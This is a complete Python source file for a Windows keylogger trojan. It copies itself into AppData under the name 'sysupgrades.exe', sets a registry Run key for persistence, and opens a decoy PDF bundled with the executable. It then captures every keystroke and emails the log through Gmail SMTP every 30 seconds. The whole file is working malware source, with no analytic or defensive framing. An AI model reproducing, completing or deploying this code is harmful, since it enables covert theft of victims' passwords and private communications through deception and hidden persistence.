import pynput.keyboard
import smtplib
import threading
import subprocess
import os
import shutil
import sys
log=""
def add_to_registry():
 new_file=os.environ["appdata"]+"\\sysupgrades.exe"
 if not os.path.exists(new_file):
  shutil.copyfile(sys.executable,new_file)
  regedit_command="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d "+new_file
  subprocess.call(regedit_command,shell=True)
add_to_registry()
def open_added_file():
 added_file=sys._MEIPASS+"\\cyber.pdf"
 subprocess.Popen(added_file,shell=True)
open_added_file()
def callback_function(key):
 global log
 try:
  log=log+key.char.encode("utf-8").decode()
 except AttributeError:
  if key==key.space:
   log=log+" "
  else:
   log=log+str(key)
def send_email(email,password,message):
 email_server=smtplib.SMTP("smtp.gmail.com",587)
 email_server.starttls()
 email_server.login(email,password)
 email_server.sendmail(email,email,message)
 email_server.quit()
def thread_function():
 global log
 send_email("Your email address","your email password",log)
 log=""
 timer_object=threading.Timer(30,thread_function)
 timer_object.start()
keylogger_listener=pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
 thread_function()
 keylogger_listener.join()

